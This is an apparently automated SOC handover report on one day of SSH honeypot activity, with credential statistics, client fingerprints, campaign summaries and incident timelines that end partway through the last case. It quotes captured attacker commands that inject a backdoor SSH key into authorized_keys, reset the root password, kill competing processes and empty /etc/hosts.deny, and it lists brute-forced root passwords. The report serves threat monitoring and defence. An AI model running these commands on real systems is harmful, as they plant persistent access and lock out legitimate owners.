# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-01 |
| **Generated At** | 2026-04-01T13:17:37Z |
| **Shift Time** | 13:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **78** |
| Confirmed Threats | **71** |
| False Positives Filtered | **7** (9.0%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **15** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **59** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **46** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **20** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `Debian` | 3 |
| `config` | 2 |
| `345gs5662d34` | 2 |
| `administrator` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `77777` | 3 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root1234` | `172.210.53.227` | 2026-04-01T10:57:06 |
| `root` | `toor` | `102.66.151.93` | 2026-04-01T11:05:57 |
| `root` | `root@1234` | `172.210.53.227` | 2026-04-01T11:11:02 |
| `root` | `Jw123456` | `120.48.140.232` | 2026-04-01T11:29:14 |
| `root` | `adminadmin` | `172.210.53.227` | 2026-04-01T11:38:45 |
| `root` | `Qwe123_!` | `35.237.94.18` | 2026-04-01T11:38:52 |
| `root` | `3245gs5662d34` | `35.237.94.18` | 2026-04-01T11:38:58 |
| `root` | `root2005` | `24.237.119.118` | 2026-04-01T12:05:15 |
| `root` | `Administrator` | `172.210.53.227` | 2026-04-01T12:06:39 |
| `root` | `sky` | `203.145.34.222` | 2026-04-01T12:07:21 |
| `root` | `3245gs5662d34` | `203.145.34.222` | 2026-04-01T12:07:27 |
| `root` | `abcde12345` | `14.103.123.169` | 2026-04-01T12:17:37 |
| `root` | `Admin` | `172.210.53.227` | 2026-04-01T12:20:43 |
| `root` | `admin1234` | `172.210.53.227` | 2026-04-01T12:34:52 |
| `root` | `admin12345` | `172.210.53.227` | 2026-04-01T12:48:57 |
| `root` | `Kem_6o??` | `150.242.15.125` | 2026-04-01T12:50:00 |
| `root` | `77777` | `211.20.26.201` | 2026-04-01T12:56:07 |
| `root` | `77777` | `62.201.212.54` | 2026-04-01T12:56:14 |
| `root` | `Admin1234` | `172.210.53.227` | 2026-04-01T13:03:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **78** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 25 |
| OpenSSH | 22 |
| Go SSH scanner | 10 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 22 | 22 |
| `03a80b21afa8...` | Modern SSH client | 20 | 5 |
| `16443846184e...` | Generic scanner | 8 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `a2de0f306611...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 22 | 22 | Mirai/variant |
| `03a80b21afa8...` | libssh | 20 | 5 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 8 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:gQ65DkcD8CAD"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.140.232`, `14.103.123.169`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
/bin/busybox BOT
```
Source IPs: `102.66.151.93`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.145.34.222`, `35.237.94.18`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **31** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | MEDIUM |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS4808` | China Unicom Beijing Province Network | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-35b39d81bc72

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 10:57 |
| **Last Seen** | 2026-04-01 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:57:05` | `cowrie.session.connect` |
| `2026-04-01 10:57:05` | `cowrie.client.version` |
| `2026-04-01 10:57:05` | `cowrie.client.kex` |
| `2026-04-01 10:57:06` | `cowrie.login.success` |
| `2026-04-01 10:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-282cc43bb0c5

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 11:11 |
| **Last Seen** | 2026-04-01 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 11:11:01` | `cowrie.session.connect` |
| `2026-04-01 11:11:01` | `cowrie.client.version` |
| `2026-04-01 11:11:01` | `cowrie.client.kex` |
| `2026-04-01 11:11:02` | `cowrie.login.success` |
| `2026-04-01 11:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d6daae0a618

| Field | Detail |
|---|---|
| **Source IP** | `120.48.140[.]232` |
| **First Seen** | 2026-04-01 11:29 |
| **Last Seen** | 2026-04-01 11:29 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gQ65DkcD8CAD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 11:29:08` | `cowrie.session.connect` |
| `2026-04-01 11:29:08` | `cowrie.client.version` |
| `2026-04-01 11:29:11` | `cowrie.client.kex` |
| `2026-04-01 11:29:14` | `cowrie.login.success` |
| `2026-04-01 11:29:14` | `cowrie.session.params` |
| `2026-04-01 11:29:14` | `cowrie.command.input` |
| `2026-04-01 11:29:14` | `cowrie.command.failed` |
| `2026-04-01 11:29:15` | `cowrie.log.closed` |
| `2026-04-01 11:29:16` | `cowrie.session.params` |
| `2026-04-01 11:29:16` | `cowrie.command.input` |
| `2026-04-01 11:29:16` | `cowrie.session.file_download` |
| `2026-04-01 11:29:16` | `cowrie.log.closed` |
| `2026-04-01 11:29:30` | `cowrie.session.params` |
| `2026-04-01 11:29:30` | `cowrie.command.input` |
| `2026-04-01 11:29:31` | `cowrie.log.closed` |
| `2026-04-01 11:29:32` | `cowrie.session.params` |
| `2026-04-01 11:29:32` | `cowrie.command.input` |
| `2026-04-01 11:29:32` | `cowrie.log.closed` |
| `2026-04-01 11:29:33` | `cowrie.session.params` |
| `2026-04-01 11:29:33` | `cowrie.command.input` |
| `2026-04-01 11:29:34` | `cowrie.session.file_download` |
| `2026-04-01 11:29:34` | `cowrie.log.closed` |
| `2026-04-01 11:29:34` | `cowrie.session.params` |
| `2026-04-01 11:29:34` | `cowrie.command.input` |
| `2026-04-01 11:29:34` | `cowrie.log.closed` |
| `2026-04-01 11:29:35` | `cowrie.session.params` |
| `2026-04-01 11:29:35` | `cowrie.command.input` |
| `2026-04-01 11:29:35` | `cowrie.log.closed` |
| `2026-04-01 11:29:36` | `cowrie.session.params` |
| `2026-04-01 11:29:36` | `cowrie.command.input` |
| `2026-04-01 11:29:36` | `cowrie.command.input` |
| `2026-04-01 11:29:37` | `cowrie.log.closed` |
| `2026-04-01 11:29:38` | `cowrie.session.params` |
| `2026-04-01 11:29:38` | `cowrie.command.input` |
| `2026-04-01 11:29:39` | `cowrie.log.closed` |
| `2026-04-01 11:29:39` | `cowrie.session.params` |
| `2026-04-01 11:29:39` | `cowrie.command.input` |
| `2026-04-01 11:29:39` | `cowrie.log.closed` |
| `2026-04-01 11:29:40` | `cowrie.session.params` |
| `2026-04-01 11:29:40` | `cowrie.command.input` |
| `2026-04-01 11:29:41` | `cowrie.log.closed` |
| `2026-04-01 11:29:42` | `cowrie.session.params` |
| `2026-04-01 11:29:42` | `cowrie.command.input` |
| `2026-04-01 11:29:42` | `cowrie.log.closed` |
| `2026-04-01 11:29:46` | `cowrie.session.params` |
| `2026-04-01 11:29:46` | `cowrie.command.input` |
| `2026-04-01 11:29:48` | `cowrie.log.closed` |
| `2026-04-01 11:29:49` | `cowrie.session.params` |
| `2026-04-01 11:29:49` | `cowrie.command.input` |
| `2026-04-01 11:29:50` | `cowrie.log.closed` |
| `2026-04-01 11:29:52` | `cowrie.session.params` |
| `2026-04-01 11:29:52` | `cowrie.command.input` |
| `2026-04-01 11:29:53` | `cowrie.log.closed` |
| `2026-04-01 11:29:56` | `cowrie.session.params` |
| `2026-04-01 11:29:56` | `cowrie.command.input` |
| `2026-04-01 11:29:57` | `cowrie.log.closed` |
| `2026-04-01 11:29:57` | `cowrie.session.params` |
| `2026-04-01 11:29:57` | `cowrie.command.input` |
| `2026-04-01 11:29:58` | `cowrie.log.closed` |
| `2026-04-01 11:29:58` | `cowrie.session.params` |
| `2026-04-01 11:29:58` | `cowrie.command.input` |
| `2026-04-01 11:29:59` | `cowrie.log.closed` |
| `2026-04-01 11:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.140[.]232` to AbuseIPDB if not already reported
- [ ] Block `120.48.140[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6205d096505

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 11:38 |
| **Last Seen** | 2026-04-01 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 11:38:44` | `cowrie.session.connect` |
| `2026-04-01 11:38:44` | `cowrie.client.version` |
| `2026-04-01 11:38:44` | `cowrie.client.kex` |
| `2026-04-01 11:38:45` | `cowrie.login.success` |
| `2026-04-01 11:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428cb6daae08

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-04-01 11:38 |
| **Last Seen** | 2026-04-01 11:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 11:38:51` | `cowrie.session.connect` |
| `2026-04-01 11:38:51` | `cowrie.client.version` |
| `2026-04-01 11:38:51` | `cowrie.client.kex` |
| `2026-04-01 11:38:52` | `cowrie.login.success` |
| `2026-04-01 11:38:52` | `cowrie.session.params` |
| `2026-04-01 11:38:52` | `cowrie.command.input` |
| `2026-04-01 11:38:52` | `cowrie.command.failed` |
| `2026-04-01 11:38:53` | `cowrie.log.closed` |
| `2026-04-01 11:38:53` | `cowrie.session.params` |
| `2026-04-01 11:38:53` | `cowrie.command.input` |
| `2026-04-01 11:38:53` | `cowrie.session.file_download` |
| `2026-04-01 11:38:53` | `cowrie.log.closed` |
| `2026-04-01 11:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b5e8d1314bf

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-04-01 11:38 |
| **Last Seen** | 2026-04-01 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 11:38:56` | `cowrie.session.connect` |
| `2026-04-01 11:38:56` | `cowrie.client.version` |
| `2026-04-01 11:38:57` | `cowrie.client.kex` |
| `2026-04-01 11:38:58` | `cowrie.login.success` |
| `2026-04-01 11:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c3801e4eac

| Field | Detail |
|---|---|
| **Source IP** | `24.237.119[.]118` |
| **First Seen** | 2026-04-01 12:05 |
| **Last Seen** | 2026-04-01 12:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:05:13` | `cowrie.session.connect` |
| `2026-04-01 12:05:13` | `cowrie.client.version` |
| `2026-04-01 12:05:13` | `cowrie.client.kex` |
| `2026-04-01 12:05:15` | `cowrie.login.success` |
| `2026-04-01 12:05:16` | `cowrie.direct-tcpip.request` |
| `2026-04-01 12:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.237.119[.]118` to AbuseIPDB if not already reported
- [ ] Block `24.237.119[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7b2b067e6a

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 12:06 |
| **Last Seen** | 2026-04-01 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:06:38` | `cowrie.session.connect` |
| `2026-04-01 12:06:38` | `cowrie.client.version` |
| `2026-04-01 12:06:38` | `cowrie.client.kex` |
| `2026-04-01 12:06:39` | `cowrie.login.success` |
| `2026-04-01 12:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eba2c20296b

| Field | Detail |
|---|---|
| **Source IP** | `203.145.34[.]222` |
| **First Seen** | 2026-04-01 12:07 |
| **Last Seen** | 2026-04-01 12:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:07:20` | `cowrie.session.connect` |
| `2026-04-01 12:07:20` | `cowrie.client.version` |
| `2026-04-01 12:07:20` | `cowrie.client.kex` |
| `2026-04-01 12:07:21` | `cowrie.login.success` |
| `2026-04-01 12:07:22` | `cowrie.session.params` |
| `2026-04-01 12:07:22` | `cowrie.command.input` |
| `2026-04-01 12:07:22` | `cowrie.command.failed` |
| `2026-04-01 12:07:22` | `cowrie.log.closed` |
| `2026-04-01 12:07:22` | `cowrie.session.params` |
| `2026-04-01 12:07:22` | `cowrie.command.input` |
| `2026-04-01 12:07:23` | `cowrie.session.file_download` |
| `2026-04-01 12:07:23` | `cowrie.log.closed` |
| `2026-04-01 12:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.34[.]222` to AbuseIPDB if not already reported
- [ ] Block `203.145.34[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ff2efab166

| Field | Detail |
|---|---|
| **Source IP** | `203.145.34[.]222` |
| **First Seen** | 2026-04-01 12:07 |
| **Last Seen** | 2026-04-01 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:07:25` | `cowrie.session.connect` |
| `2026-04-01 12:07:25` | `cowrie.client.version` |
| `2026-04-01 12:07:26` | `cowrie.client.kex` |
| `2026-04-01 12:07:27` | `cowrie.login.success` |
| `2026-04-01 12:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.34[.]222` to AbuseIPDB if not already reported
- [ ] Block `203.145.34[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebde342027dc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]169` |
| **First Seen** | 2026-04-01 12:17 |
| **Last Seen** | 2026-04-01 12:18 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Lw0NVK4UD8Du"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:17:37` | `cowrie.session.connect` |
| `2026-04-01 12:17:37` | `cowrie.client.version` |
| `2026-04-01 12:17:37` | `cowrie.client.kex` |
| `2026-04-01 12:17:37` | `cowrie.login.success` |
| `2026-04-01 12:17:38` | `cowrie.session.params` |
| `2026-04-01 12:17:38` | `cowrie.command.input` |
| `2026-04-01 12:17:38` | `cowrie.command.failed` |
| `2026-04-01 12:17:38` | `cowrie.log.closed` |
| `2026-04-01 12:17:38` | `cowrie.session.params` |
| `2026-04-01 12:17:38` | `cowrie.command.input` |
| `2026-04-01 12:17:38` | `cowrie.session.file_download` |
| `2026-04-01 12:17:38` | `cowrie.log.closed` |
| `2026-04-01 12:17:54` | `cowrie.session.params` |
| `2026-04-01 12:17:54` | `cowrie.command.input` |
| `2026-04-01 12:17:54` | `cowrie.log.closed` |
| `2026-04-01 12:17:55` | `cowrie.session.params` |
| `2026-04-01 12:17:55` | `cowrie.command.input` |
